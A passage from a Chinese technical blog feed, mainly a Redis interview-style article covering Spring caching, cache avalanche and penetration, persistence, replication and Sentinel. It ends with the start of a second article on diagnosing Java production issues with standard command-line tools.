id);}</code></pre><p>接口实现类 UserServiceImpl.java：</p><pre><code class="text">@Servicepublic class UserServiceImpl implements UserService{    public static Logger logger = LogManager.getLogger(UserServiceImpl.class);    private static Map&lt;Integer, User&gt; userMap = new HashMap&lt;&gt;();    static {        userMap.put(1, new User(1, &quot;肖战&quot;, 25));        userMap.put(2, new User(2, &quot;王一博&quot;, 26));        userMap.put(3, new User(3, &quot;杨紫&quot;, 24));    }    @CachePut(value =&quot;user&quot;, key = &quot;#user.id&quot;)    @Override    public User save(User user) {        userMap.put(user.getId(), user);        logger.info(&quot;进入save方法，当前存储对象：{}&quot;, user.toString());        return user;    }    @CacheEvict(value=&quot;user&quot;, key = &quot;#id&quot;)    @Override    public void delete(int id) {        userMap.remove(id);        logger.info(&quot;进入delete方法，删除成功&quot;);    }    @Cacheable(value = &quot;user&quot;, key = &quot;#id&quot;)    @Override    public User get(Integer id) {        logger.info(&quot;进入get方法，当前获取对象：{}&quot;, userMap.get(id)==null?null:userMap.get(id).toString());        return userMap.get(id);    }}</code></pre><p>为了方便演示数据库的操作，这里直接定义了一个 Map&lt;Integer,User&gt; userMap。</p><p>这里的核心是三个注解：</p><ul><li><strong>@Cachable</strong></li><li><strong>@CachePut</strong></li><li><strong>@CacheEvict</strong></li></ul><p>测试类：UserController</p><pre><code class="text">@RestController@RequestMapping(&quot;/user&quot;)public class UserController {    public static Logger logger = LogManager.getLogger(UserController.class);    @Autowired    private StringRedisTemplate stringRedisTemplate;    @Autowired    private RedisTemplate&lt;String, Serializable&gt; redisCacheTemplate;    @Autowired    private UserService userService;    @RequestMapping(&quot;/test&quot;)    public void test() {        redisCacheTemplate.opsForValue().set(&quot;userkey&quot;, new User(1, &quot;张三&quot;, 25));        User user = (User) redisCacheTemplate.opsForValue().get(&quot;userkey&quot;);        logger.info(&quot;当前获取对象：{}&quot;, user.toString());    }    @RequestMapping(&quot;/add&quot;)    public void add() {        User user = userService.save(new User(4, &quot;李现&quot;, 30));        logger.info(&quot;添加的用户信息：{}&quot;,user.toString());    }    @RequestMapping(&quot;/delete&quot;)    public void delete() {        userService.delete(4);    }    @RequestMapping(&quot;/get/{id}&quot;)    public void get(@PathVariable(&quot;id&quot;) String idStr) throws Exception{        if (StringUtils.isBlank(idStr)) {            throw new Exception(&quot;id为空&quot;);        }        Integer id = Integer.parseInt(idStr);        User user = userService.get(id);        logger.info(&quot;获取的用户信息：{}&quot;,user.toString());    }}</code></pre><p>用缓存要注意，启动类要加上一个注解开启缓存：</p><pre><code class="text">@SpringBootApplication(exclude=DataSourceAutoConfiguration.class)@EnableCachingpublic class Application {    public static void main(String[] args) {        SpringApplication.run(Application.class, args);    }}</code></pre><p>①先调用添加接口：<a href="http://localhost:8082/user/add" target="_blank" rel="noopener">http://localhost:8082/user/add</a></p><p><img src="/写作技巧/writing/we-redis-summary/v2-c1bca7d17cddfcf85dd7f978a416a784_1440w-20200621104222052.png" alt="img"></p><p>②再调用查询接口，查询 id=4 的用户信息：</p><p><img src="/写作技巧/writing/we-redis-summary/v2-b3b71fffac020c234f718d48bb49bd18_1440w-20200621104222032.png" alt="img"></p><p>可以看出，这里已经从缓存中获取数据了，因为上一步 add 方法已经把 id=4 的用户数据放入了 Redis 缓存 3、调用删除方法，删除 id=4 的用户信息，同时清除缓存：</p><p><img src="/写作技巧/writing/we-redis-summary/v2-51b1a94e60af8fa36f65fa3d374509d3_1440w-20200621104221731.png" alt="img"></p><p>④再次调用查询接口，查询 id=4 的用户信息：</p><p><img src="/写作技巧/writing/we-redis-summary/v2-aef3746fcb2e9c332903439e6147a4cf_1440w-20200621104221899.png" alt="img"></p><p>没有了缓存，所以进入了 get 方法，从 userMap 中获取。</p><p><strong>缓存注解</strong></p><p><strong>①@Cacheable</strong></p><p>根据方法的请求参数对其结果进行缓存：</p><ul><li><strong>Key：</strong>缓存的 Key，可以为空，如果指定要按照 SPEL 表达式编写，如果不指定，则按照方法的所有参数进行组合。</li><li><strong>Value：</strong>缓存的名称，必须指定至少一个（如 @Cacheable (value=’user’)或者 @Cacheable(value={‘user1’,’user2’})）</li><li><strong>Condition：</strong>缓存的条件，可以为空，使用 SPEL 编写，返回 true 或者 false，只有为 true 才进行缓存。</li></ul><p><strong>②@CachePut</strong></p><p>根据方法的请求参数对其结果进行缓存，和 @Cacheable 不同的是，它每次都会触发真实方法的调用。参数描述见上。</p><p><strong>③@CacheEvict</strong></p><p>根据条件对缓存进行清空：</p><ul><li>Key：同上。</li><li>Value：同上。</li><li>Condition：同上。</li><li>allEntries：是否清空所有缓存内容，缺省为 false，如果指定为 true，则方法调用后将立即清空所有缓存。</li><li><strong>beforeInvocation：</strong>是否在方法执行前就清空，缺省为 false，如果指定为 true，则在方法还没有执行的时候就清空缓存。缺省情况下，如果方法执行抛出异常，则不会清空缓存。</li></ul><p>缓存问题<br><strong>面试官：</strong>看了一下你的 Demo，简单易懂。那你在实际项目中使用缓存有遇到什么问题或者会遇到什么问题你知道吗？</p><p><strong>我：</strong>缓存和数据库数据一致性问题：分布式环境下非常容易出现缓存和数据库间数据一致性问题，针对这一点，如果项目对缓存的要求是强一致性的，那么就不要使用缓存。</p><p>我们只能采取合适的策略来降低缓存和数据库间数据不一致的概率，而无法保证两者间的强一致性。</p><p>合适的策略包括合适的缓存更新策略，更新数据库后及时更新缓存、缓存失败时增加重试机制。</p><p><strong>面试官：</strong>Redis 雪崩了解吗？</p><p><strong>我：</strong>我了解的，目前电商首页以及热点数据都会去做缓存，一般缓存都是定时任务去刷新，或者查不到之后去更新缓存的，定时任务刷新就有一个问题。</p><p>举个栗子：如果首页所有 Key 的失效时间都是 12 小时，中午 12 点刷新的，我零点有个大促活动大量用户涌入，假设每秒 6000 个请求，本来缓存可以抗住每秒 5000 个请求，但是缓存中所有 Key 都失效了。</p><p>此时 6000 个/秒的请求全部落在了数据库上，数据库必然扛不住，真实情况可能 DBA 都没反应过来直接挂了。</p><p>此时，如果没什么特别的方案来处理，DBA 很着急，重启数据库，但是数据库立马又被新流量给打死了。这就是我理解的缓存雪崩。</p><p><strong>我心想：</strong>同一时间大面积失效，瞬间 Redis 跟没有一样，那这个数量级别的请求直接打到数据库几乎是灾难性的。</p><p>你想想如果挂的是一个用户服务的库，那其他依赖他的库所有接口几乎都会报错。</p><p>如果没做熔断等策略基本上就是瞬间挂一片的节奏，你怎么重启用户都会把你打挂，等你重启好的时候，用户早睡觉去了，临睡之前，骂骂咧咧“什么垃圾产品”。</p><p><strong>面试官摸摸了自己的头发：</strong>嗯，还不错，那这种情况你都是怎么应对的？</p><p><strong>我：</strong>处理缓存雪崩简单，在批量往 Redis 存数据的时候，把每个 Key 的失效时间都加个随机值就好了，这样可以保证数据不会再同一时间大面积失效。</p><pre><code class="text">setRedis（key, value, time+Math.random()*10000）;</code></pre><p>如果 Redis 是集群部署，将热点数据均匀分布在不同的 Redis 库中也能避免全部失效。</p><p>或者设置热点数据永不过期，有更新操作就更新缓存就好了（比如运维更新了首页商品，那你刷下缓存就好了，不要设置过期时间），电商首页的数据也可以用这个操作，保险。</p><p><strong>面试官：</strong>那你了解缓存穿透和击穿么，可以说说他们跟雪崩的区别吗？</p><p><strong>我：</strong>嗯，了解，先说下缓存穿透吧，缓存穿透是指缓存和数据库中都没有的数据，而用户（黑客）不断发起请求。</p><p>举个栗子：我们数据库的 id 都是从 1 自增的，如果发起 id=-1 的数据或者 id 特别大不存在的数据，这样的不断攻击导致数据库压力很大，严重会击垮数据库。</p><p><strong>我又接着说：</strong>至于缓存击穿嘛，这个跟缓存雪崩有点像，但是又有一点不一样，缓存雪崩是因为大面积的缓存失效，打崩了 DB。</p><p>而缓存击穿不同的是缓存击穿是指一个 Key 非常热点，在不停地扛着大量的请求，大并发集中对这一个点进行访问，当这个 Key 在失效的瞬间，持续的大并发直接落到了数据库上，就在这个 Key 的点上击穿了缓存。</p><p><strong>面试官露出欣慰的眼光：</strong>那他们分别怎么解决？</p><p><strong>我：</strong>缓存穿透我会在接口层增加校验，比如用户鉴权，参数做校验，不合法的校验直接 return，比如 id 做基础校验，id&lt;=0 直接拦截。</p><p><strong>面试官：</strong>那你还有别的方法吗？</p><p><strong>我：</strong>我记得 Redis 里还有一个高级用法布隆过滤器（Bloom Filter）这个也能很好的预防缓存穿透的发生。</p><p>它的原理也很简单，就是利用高效的数据结构和算法快速判断出你这个 Key 是否在数据库中存在，不存在你 return 就好了，存在你就去查 DB 刷新 KV 再 return。</p><p>缓存击穿的话，设置热点数据永不过期，或者加上互斥锁就搞定了。作为暖男，代码给你准备好了，拿走不谢。</p><pre><code class="text">public static String getData(String key) throws InterruptedException {        //从Redis查询数据        String result = getDataByKV(key);        //参数校验        if (StringUtils.isBlank(result)) {            try {                //获得锁                if (reenLock.tryLock()) {                    //去数据库查询                    result = getDataByDB(key);                    //校验                    if (StringUtils.isNotBlank(result)) {                        //插进缓存                        setDataToKV(key, result);                    }                } else {                    //睡一会再拿                    Thread.sleep(100L);                    result = getData(key);                }            } finally {                //释放锁                reenLock.unlock();            }        }        return result;    }</code></pre><p><strong>面试官：</strong>嗯嗯，还不错。</p><p>Redis 为何这么快</p><p><strong>面试官：</strong>Redis 作为缓存大家都在用，那 Redis 一定很快咯？</p><p><strong>我：</strong>当然了，官方提供的数据可以达到 100000+ 的 QPS（每秒内的查询次数），这个数据不比 Memcached 差！</p><p><strong>面试官：</strong>Redis 这么快，它的“多线程模型”你了解吗？（露出邪魅一笑）</p><p><strong>我：</strong>您是想问 Redis 这么快，为什么还是单线程的吧。Redis 确实是单进程单线程的模型，因为 Redis 完全是基于内存的操作，CPU 不是 Redis 的瓶颈，Redis 的瓶颈最有可能是机器内存的大小或者网络带宽。</p><p>既然单线程容易实现，而且 CPU 不会成为瓶颈，那就顺理成章的采用单线程的方案了（毕竟采用多线程会有很多麻烦）。</p><p><strong>面试官：</strong>嗯，是的。那你能说说 Redis 是单线程的，为什么还能这么快吗？</p><p><strong>我：</strong>可以这么说吧，总结一下有如下四点：</p><ul><li>Redis 完全基于内存，绝大部分请求是纯粹的内存操作，非常迅速，数据存在内存中，类似于 HashMap，HashMap 的优势就是查找和操作的时间复杂度是 O(1)。</li><li>数据结构简单，对数据操作也简单。</li><li>采用单线程，避免了不必要的上下文切换和竞争条件，不存在多线程导致的 CPU 切换，不用去考虑各种锁的问题，不存在加锁释放锁操作，没有死锁问题导致的性能消耗。</li><li>使用多路复用 IO 模型，非阻塞 IO。</li></ul><p>Redis 和 Memcached 的区别</p><p><strong>面试官：</strong>嗯嗯，说的很详细。那你为什么选择 Redis 的缓存方案而不用 Memcached 呢？</p><p><strong>我：</strong>原因有如下四点：</p><ul><li><strong>存储方式上：</strong>Memcache 会把数据全部存在内存之中，断电后会挂掉，数据不能超过内存大小。Redis 有部分数据存在硬盘上，这样能保证数据的持久性。</li><li><strong>数据支持类型上：</strong>Memcache 对数据类型的支持简单，只支持简单的 key-value，，而 Redis 支持五种数据类型。</li><li><strong>使用底层模型不同：</strong>它们之间底层实现方式以及与客户端之间通信的应用协议不一样。Redis 直接自己构建了 VM 机制，因为一般的系统调用系统函数的话，会浪费一定的时间去移动和请求。</li><li><strong>Value 的大小：</strong>Redis 可以达到 1GB，而 Memcache 只有 1MB。</li></ul><p>淘汰策略</p><p><strong>面试官：</strong>那你说说你知道的 Redis 的淘汰策略有哪些？</p><p><strong>我：</strong>Redis 有六种淘汰策略，如下图：</p><p><img src="/写作技巧/writing/we-redis-summary/v2-10931268fb1a7c832c4933795d6a4e71_1440w-20200621104221891.jpg" alt="img"></p><p><strong>补充一下：</strong>Redis 4.0 加入了 LFU（least frequency use）淘汰策略，包括 volatile-lfu 和 allkeys-lfu，通过统计访问频率，将访问频率最少，即最不经常使用的 KV 淘汰。</p><p>持久化</p><p><strong>面试官：</strong>你对 Redis 的持久化机制了解吗？能讲一下吗？</p><p><strong>我：</strong>Redis 为了保证效率，数据缓存在了内存中，但是会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件中，以保证数据的持久化。</p><p>Redis 的持久化策略有两种：</p><ul><li><strong>RDB：</strong>快照形式是直接把内存中的数据保存到一个 dump 的文件中，定时保存，保存策略。</li><li><strong>AOF：</strong>把所有的对 Redis 的服务器进行修改的命令都存到一个文件里，命令的集合。Redis 默认是快照 RDB 的持久化方式。</li></ul><p>当 Redis 重启的时候，它会优先使用 AOF 文件来还原数据集，因为 AOF 文件保存的数据集通常比 RDB 文件所保存的数据集更完整。你甚至可以关闭持久化功能，让数据只在服务器运行时存。</p><p><strong>面试官：</strong>那你再说下 RDB 是怎么工作的？</p><p><strong>我：</strong>默认 Redis 是会以快照”RDB”的形式将数据持久化到磁盘的一个二进制文件 dump.rdb。</p><p>工作原理简单说一下：当 Redis 需要做持久化时，Redis 会 fork 一个子进程，子进程将数据写到磁盘上一个临时 RDB 文件中。</p><p>当子进程完成写临时文件后，将原来的 RDB 替换掉，这样的好处是可以 copy-on-write。</p><p><strong>我：</strong>RDB 的优点是：这种文件非常适合用于备份：比如，你可以在最近的 24 小时内，每小时备份一次，并且在每个月的每一天也备份一个 RDB 文件。</p><p>这样的话，即使遇上问题，也可以随时将数据集还原到不同的版本。RDB 非常适合灾难恢复。</p><p>RDB 的缺点是：如果你需要尽量避免在服务器故障时丢失数据，那么RDB不合适你。</p><p><strong>面试官：</strong>那你要不再说下 AOF？</p><p><strong>我：</strong>（说就一起说下吧）使用 AOF 做持久化，每一个写命令都通过 write 函数追加到 appendonly.aof 中，配置方式如下：</p><pre><code class="text">appendfsync yes   appendfsync always     #每次有数据修改发生时都会写入AOF文件。appendfsync everysec   #每秒钟同步一次，该策略为AOF的缺省策略。</code></pre><p>AOF 可以做到全程持久化，只需要在配置中开启 appendonly yes。这样 Redis 每执行一个修改数据的命令，都会把它添加到 AOF 文件中，当 Redis 重启时，将会读取 AOF 文件进行重放，恢复到 Redis 关闭前的最后时刻。</p><p>我顿了一下，继续说：使用 AOF 的优点是会让 Redis 变得非常耐久。可以设置不同的 Fsync 策略，AOF的默认策略是每秒钟 Fsync 一次，在这种配置下，就算发生故障停机，也最多丢失一秒钟的数据。</p><p>缺点是对于相同的数据集来说，AOF 的文件体积通常要大于 RDB 文件的体积。根据所使用的 Fsync 策略，AOF 的速度可能会慢于 RDB。</p><p><strong>面试官又问：</strong>你说了这么多，那我该用哪一个呢？</p><p><strong>我：</strong>如果你非常关心你的数据，但仍然可以承受数分钟内的数据丢失，那么可以额只使用 RDB 持久。</p><p>AOF 将 Redis 执行的每一条命令追加到磁盘中，处理巨大的写入会降低Redis的性能，不知道你是否可以接受。</p><p>数据库备份和灾难恢复：定时生成 RDB 快照非常便于进行数据库备份，并且 RDB 恢复数据集的速度也要比 AOF 恢复的速度快。</p><p>当然了，Redis 支持同时开启 RDB 和 AOF，系统重启后，Redis 会优先使用 AOF 来恢复数据，这样丢失的数据会最少。</p><p><strong>主从复制</strong></p><p><strong>面试官：</strong>Redis 单节点存在单点故障问题，为了解决单点问题，一般都需要对 Redis 配置从节点，然后使用哨兵来监听主节点的存活状态，如果主节点挂掉，从节点能继续提供缓存功能，你能说说 Redis 主从复制的过程和原理吗？</p><p>我有点懵，这个说来就话长了。但幸好提前准备了：主从配置结合哨兵模式能解决单点故障问题，提高 Redis 可用性。</p><p>从节点仅提供读操作，主节点提供写操作。对于读多写少的状况，可给主节点配置多个从节点，从而提高响应效率。</p><p><strong>我顿了一下，接着说：</strong>关于复制过程，是这样的：</p><ul><li>从节点执行 slaveof[masterIP][masterPort]，保存主节点信息。</li><li>从节点中的定时任务发现主节点信息，建立和主节点的 Socket 连接。</li><li>从节点发送 Ping 信号，主节点返回 Pong，两边能互相通信。</li><li>连接建立后，主节点将所有数据发送给从节点（数据同步）。</li><li>主节点把当前的数据同步给从节点后，便完成了复制的建立过程。接下来，主节点就会持续的把写命令发送给从节点，保证主从数据一致性。</li></ul><p><strong>面试官：</strong>那你能详细说下数据同步的过程吗？</p><p>（我心想：这也问的太细了吧）我：可以。Redis 2.8 之前使用 sync[runId][offset] 同步命令，Redis 2.8 之后使用 psync[runId][offset] 命令。</p><p>两者不同在于，Sync 命令仅支持全量复制过程，Psync 支持全量和部分复制。</p><p>介绍同步之前，先介绍几个概念：</p><ul><li><strong>runId：</strong>每个 Redis 节点启动都会生成唯一的 uuid，每次 Redis 重启后，runId 都会发生变化。</li><li><strong>offset：</strong>主节点和从节点都各自维护自己的主从复制偏移量 offset，当主节点有写入命令时，offset=offset+命令的字节长度。<br>从节点在收到主节点发送的命令后，也会增加自己的 offset，并把自己的 offset 发送给主节点。<br>这样，主节点同时保存自己的 offset 和从节点的 offset，通过对比 offset 来判断主从节点数据是否一致。</li><li><strong>repl_backlog_size：</strong>保存在主节点上的一个固定长度的先进先出队列，默认大小是 1MB。</li></ul><p>主节点发送数据给从节点过程中，主节点还会进行一些写操作，这时候的数据存储在复制缓冲区中。</p><p>从节点同步主节点数据完成后，主节点将缓冲区的数据继续发送给从节点，用于部分复制。</p><p>主节点响应写命令时，不但会把命名发送给从节点，还会写入复制积压缓冲区，用于复制命令丢失的数据补救。</p><p><img src="/写作技巧/writing/we-redis-summary/v2-1654bf274fa7005445fae6f884b547df_1440w-20200621104221904.jpg" alt="img"></p><p>上面是 Psync 的执行流程，从节点发送 psync[runId][offset] 命令，主节点有三种响应：</p><ul><li><strong>FULLRESYNC：</strong>第一次连接，进行全量复制</li><li><strong>CONTINUE：</strong>进行部分复制</li><li><strong>ERR：</strong>不支持 psync 命令，进行全量复制</li></ul><p><strong>面试官：</strong>很好，那你能具体说下全量复制和部分复制的过程吗？</p><p><strong>我：</strong>可以！</p><p><img src="/写作技巧/writing/we-redis-summary/v2-f97625e47cf8105533113717d55602fd_1440w-20200621104221877.jpg" alt="img"></p><p>上面是全量复制的流程。主要有以下几步：</p><ul><li>从节点发送 psync ? -1 命令（因为第一次发送，不知道主节点的 runId，所以为?，因为是第一次复制，所以 offset=-1）。</li><li>主节点发现从节点是第一次复制，返回 FULLRESYNC {runId} {offset}，runId 是主节点的 runId，offset 是主节点目前的 offset。</li><li>从节点接收主节点信息后，保存到 info 中。</li><li>主节点在发送 FULLRESYNC 后，启动 bgsave 命令，生成 RDB 文件（数据持久化）。</li><li>主节点发送 RDB 文件给从节点。到从节点加载数据完成这段期间主节点的写命令放入缓冲区。</li><li>从节点清理自己的数据库数据。</li><li>从节点加载 RDB 文件，将数据保存到自己的数据库中。如果从节点开启了 AOF，从节点会异步重写 AOF 文件。</li></ul><p>关于部分复制有以下几点说明：</p><p>①部分复制主要是 Redis 针对全量复制的过高开销做出的一种优化措施，使用 psync[runId][offset] 命令实现。</p><p>当从节点正在复制主节点时，如果出现网络闪断或者命令丢失等异常情况时，从节点会向主节点要求补发丢失的命令数据，主节点的复制积压缓冲区将这部分数据直接发送给从节点。</p><p>这样就可以保持主从节点复制的一致性。补发的这部分数据一般远远小于全量数据。</p><p>②主从连接中断期间主节点依然响应命令，但因复制连接中断命令无法发送给从节点，不过主节点内的复制积压缓冲区依然可以保存最近一段时间的写命令数据。</p><p>③当主从连接恢复后，由于从节点之前保存了自身已复制的偏移量和主节点的运行 ID。因此会把它们当做 psync 参数发送给主节点，要求进行部分复制。</p><p>④主节点接收到 psync 命令后首先核对参数 runId 是否与自身一致，如果一致，说明之前复制的是当前主节点。</p><p>之后根据参数 offset 在复制积压缓冲区中查找，如果 offset 之后的数据存在，则对从节点发送+COUTINUE 命令，表示可以进行部分复制。因为缓冲区大小固定，若发生缓冲溢出，则进行全量复制。</p><p>⑤主节点根据偏移量把复制积压缓冲区里的数据发送给从节点，保证主从复制进入正常状态。</p><p>哨兵</p><p><strong>面试官：</strong>那主从复制会存在哪些问题呢？</p><p><strong>我：</strong>主从复制会存在以下问题：</p><ul><li>一旦主节点宕机，从节点晋升为主节点，同时需要修改应用方的主节点地址，还需要命令所有从节点去复制新的主节点，整个过程需要人工干预。</li><li>主节点的写能力受到单机的限制。</li><li>主节点的存储能力受到单机的限制。</li><li>原生复制的弊端在早期的版本中也会比较突出，比如：Redis 复制中断后，从节点会发起 psync。<br>此时如果同步不成功，则会进行全量同步，主库执行全量备份的同时，可能会造成毫秒或秒级的卡顿。</li></ul><p><strong>面试官：</strong>那比较主流的解决方案是什么呢？</p><p><strong>我：</strong>当然是哨兵啊。</p><p><strong>面试官：</strong>那么问题又来了。那你说下哨兵有哪些功能？</p><p><img src="/写作技巧/writing/we-redis-summary/v2-164bb28b17f29cbee1deef58e070771a_1440w-20200621104221731.jpg" alt="img"></p><p><strong>我：</strong>如图，是 Redis Sentinel（哨兵）的架构图。Redis Sentinel（哨兵）主要功能包括主节点存活检测、主从运行情况检测、自动故障转移、主从切换。</p><p>Redis Sentinel 最小配置是一主一从。Redis 的 Sentinel 系统可以用来管理多个 Redis 服务器。</p><p>该系统可以执行以下四个任务：</p><ul><li><strong>监控：</strong>不断检查主服务器和从服务器是否正常运行。</li><li><strong>通知：</strong>当被监控的某个 Redis 服务器出现问题，Sentinel 通过 API 脚本向管理员或者其他应用程序发出通知。</li><li><strong>自动故障转移：</strong>当主节点不能正常工作时，Sentinel 会开始一次自动的故障转移操作，它会将与失效主节点是主从关系的其中一个从节点升级为新的主节点，并且将其他的从节点指向新的主节点，这样人工干预就可以免了。</li><li><strong>配置提供者：</strong>在 Redis Sentinel 模式下，客户端应用在初始化时连接的是 Sentinel 节点集合，从中获取主节点的信息。</li></ul><p><strong>面试官：</strong>那你能说下哨兵的工作原理吗？</p><p><strong>我：</strong>话不多说，直接上图：</p><p><img src="/写作技巧/writing/we-redis-summary/v2-04a114734e7c5d1032675417c013d504_1440w-20200621104222079.jpg" alt="img"></p><p>①每个 Sentinel 节点都需要定期执行以下任务：每个 Sentinel 以每秒一次的频率，向它所知的主服务器、从服务器以及其他的 Sentinel 实例发送一个 PING 命令。（如上图）</p><p><img src="/写作技巧/writing/we-redis-summary/v2-93bef86d7da374db7e5b34590f94a88e_1440w-20200621104221832.jpg" alt="img"></p><p>②如果一个实例距离最后一次有效回复 PING 命令的时间超过 down-after-milliseconds 所指定的值，那么这个实例会被 Sentinel 标记为主观下线。（如上图）</p><p><img src="/写作技巧/writing/we-redis-summary/v2-47dbd4fba83494b14c0c36f4fc2cef16_1440w-20200621104221863.jpg" alt="img"></p><p>③如果一个主服务器被标记为主观下线，那么正在监视这个服务器的所有 Sentinel 节点，要以每秒一次的频率确认主服务器的确进入了主观下线状态。</p><p><img src="/写作技巧/writing/we-redis-summary/v2-aaa116b0afc8ce6109cf2e968bf67369_1440w-20200621104221933.jpg" alt="img"></p><p>④如果一个主服务器被标记为主观下线，并且有足够数量的 Sentinel（至少要达到配置文件指定的数量）在指定的时间范围内同意这一判断，那么这个主服务器被标记为客观下线。</p><p><img src="/写作技巧/writing/we-redis-summary/v2-87ee8a63d7d76f5fd203fba4803682a2_1440w-20200621104221869.jpg" alt="img"></p><p>⑤一般情况下，每个 Sentinel 会以每 10 秒一次的频率向它已知的所有主服务器和从服务器发送 INFO 命令。</p><p>当一个主服务器被标记为客观下线时，Sentinel 向下线主服务器的所有从服务器发送 INFO 命令的频率，会从 10 秒一次改为每秒一次。</p><p><img src="/写作技巧/writing/we-redis-summary/v2-bcd1b109fb0485ebfa4b31facc15b264_1440w-20200621104222028.jpg" alt="img"></p><p>⑥Sentinel 和其他 Sentinel 协商客观下线的主节点的状态，如果处于 SDOWN 状态，则投票自动选出新的主节点，将剩余从节点指向新的主节点进行数据复制。</p><p><img src="/写作技巧/writing/we-redis-summary/v2-b42582e533f89916ca21ed866673a59b_1440w-20200621104221917.jpg" alt="img"></p><p>⑦当没有足够数量的 Sentinel 同意主服务器下线时，主服务器的客观下线状态就会被移除。</p><p>当主服务器重新向 Sentinel 的 PING 命令返回有效回复时，主服务器的主观下线状态就会被移除。</p><p><strong>面试官：</strong>不错，面试前没少下工夫啊，今天 Redis 这关你过了，明天找个时间我们再聊聊其他的。（露出欣慰的微笑）</p><p><strong>我：</strong>没问题。</p><p><strong>总结</strong></p><p>本文在一次面试的过程中讲述了 Redis 是什么，Redis 的特点和功能，Redis 缓存的使用，Redis 为什么能这么快，Redis 缓存的淘汰策略，持久化的两种方式，Redis 高可用部分的主从复制和哨兵的基本原理。</p><hr><p>分析</p><ul><li>总结类文章，适合事无巨细的总结</li><li>作为笔记类文体</li></ul>]]></content>
      
      
      <categories>
          
          <category> 写作技巧 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>java 线上 debug</title>
      <link href="/java/java/java-debug/"/>
      <url>/java/java/java-debug/</url>
      
        <content type="html"><![CDATA[<p>来源：<a href="https://fredal.xin/java-error-check" target="_blank" rel="noopener">https://fredal.xin/java-error-check</a></p><p>线上故障主要会包括cpu、磁盘、内存以及网络问题，而大多数故障可能会包含不止一个层面的问题，所以进行排查时候尽量四个方面依次排查一遍。同时例如jstack、jmap等工具也是不囿于一个方面的问题的，基本上出问题就是df、free、top 三连，然后依次jstack、jmap伺候，具体问题具体分析即可。</p><h1 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h1><p>一般来讲我们首先会排查cpu方面的问题。cpu异常往往还是比较好定位的。原因包括业务逻辑问题(死循环)、频繁gc以及上下文切换过多。而最常见的往往是业务逻辑(或者框架逻辑)导致的，可以使用jstack来分析对应的堆栈情况。</p><h3 id="使用jstack分析cpu问题"><a href="#使用jstack分析cpu问题" class="headerlink" title="使用jstack分析cpu问题"></a>使用jstack分析cpu问题</h3><p>我们先用ps命令找到对应进程的pid(如果你有好几个目标进程，可以先用top看一下哪个占用比较高)。<br>接着用<code>top -H -p pid</code>来找到cpu使用率比较高的一些线程<br><img src="/java/java/java-debug/2019-11-04-083804.png" alt="img"><br>然后将占用最高的pid转换为16进制<code>printf &#39;%x\n&#39; pid</code>得到nid<br><img src="/java/java/java-debug/2019-11-04-083806.png" alt="img"><br>接着直接在jstack中找到相应的堆栈信息<code>jstack pid |grep &#39;nid&#39; -C5 –color</code><br><img src="/java/java/java-debug/2019-11-04-83807.png" alt="img"><br>可以看到我们已经找到了nid为0x42的堆栈信息，接着只要仔细分析一番即可。</p><p>当然更常见的是我们对整个jstack文件进行分析，通常我们会比较关注WAITING和TIMED_WAITING的部分，BLOCKED就不用说了。我们可以使用命令<code>cat jstack.log | grep &quot;java.lang.Thread.State&quot; | sort -nr | uniq -c</code>来对jstack的状态有一个整体的把握，如果WAITING之类的特别多，那么多半是有问题啦。<br><img src="/java/java/java-debug/2019-11-04-083807.png" alt="img"></p><h3 id="频繁gc"><a href="#频繁gc" class="headerlink" title="频繁gc"></a>频繁gc</h3><p>当然我们还是会使用jstack来分析问题，但有时候我们可以先确定下gc是不是太频繁，使用<code>jstat -gc pid 1000</code>命令来对gc分代变化情况进行观察，1000表示采样间隔(ms)，S0C/S1C、S0U/S1U、EC/EU、OC/OU、MC/MU分别代表两个Survivor区、Eden区、老年代、元数据区的容量和使用量。YGC/YGT、FGC/FGCT、GCT则代表YoungGc、FullGc的耗时和次数以及总耗时。如果看到gc比较频繁，再针对gc方面做进一步分析，具体可以参考一下gc章节的描述。<br><img src="/java/java/java-debug/2019-11-04-083808.png" alt="img"></p><h3 id="上下文切换"><a href="#上下文切换" class="headerlink" title="上下文切换"></a>上下文切换</h3><p>针对频繁上下文问题，我们可以使用<code>vmstat</code>命令来进行查看<br><img src="/java/java/java-debug/2019-11-04-083809.png" alt="img"><br>cs(context switch)一列则代表了上下文切换的次数。<br>如果我们希望对特定的pid进行监控那么可以使用 <code>pidstat -w pid</code>命令，cswch和nvcswch表示自愿及非自愿切换。<br><img src="/java/java/java-debug/2019-11-04-83810.png" alt="img"></p><h1 id="磁盘"><a href="#磁盘" class="headerlink" title="磁盘"></a>磁盘</h1><p>磁盘问题和cpu一样是属于比较基础的。首先是磁盘空间方面，我们直接使用<code>df -hl</code>来查看文件系统状态<br><img src="/java/java/java-debug/2019-11-04-083810.png" alt="img"></p><p>更多时候，磁盘问题还是性能上的问题。我们可以通过iostat<code>iostat -d -k -x</code>来进行分析<br><img src="/java/java/java-debug/2019-11-04-083811.png" alt="img"><br>最后一列<code>%util</code>可以看到每块磁盘写入的程度，而<code>rrqpm/s</code>以及<code>wrqm/s</code>分别表示读写速度，一般就能帮助定位到具体哪块磁盘出现问题了。</p><p>另外我们还需要知道是哪个进程在进行读写，一般来说开发自己心里有数，或者用iotop命令来进行定位文件读写的来源。<br><img src="/java/java/java-debug/2019-11-04-083812.png" alt="img"><br>不过这边拿到的是tid，我们要转换成pid，可以通过readlink来找到pid<code>readlink -f /proc/*/task/tid/../..</code>。<br><img src="/java/java/java-debug/2019-11-04-83813.png" alt="img"><br>找到pid之后就可以看这个进程具体的读写情况<code>cat /proc/pid/io</code><br><img src="/java/java/java-debug/2019-11-04-083813.png" alt="img"><br>我们还可以通过lsof命令来确定具体的文件读写情况<code>lsof -p pid</code><br><img src="/java/java/java-debug/2019-11-04-083814.png" alt="img"></p><h1 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h1><p>内存问题排查起来相对比CPU麻烦一些，场景也比较多。主要包括OOM、GC问题和堆外内存。一般来讲，我们会先用<code>free</code>命令先来检查一发内存的各种情况。<br><img src="/java/java/java-debug/2019-11-04-083815.png" alt="img"></p><h3 id="堆内内存"><a href="#堆内内存" class="headerlink" title="堆内内存"></a>堆内内存</h3><p>内存问题大多还都是堆内内存问题。表象上主要分为OOM和StackOverflow。</p><h4 id="OOM"><a href="#OOM" class="headerlink" title="OOM"></a>OOM</h4><p>JMV中的内存不足，OOM大致可以分为以下几种：</p><p><strong>Exception in thread “main” java.lang.OutOfMemoryError: unable to create new native 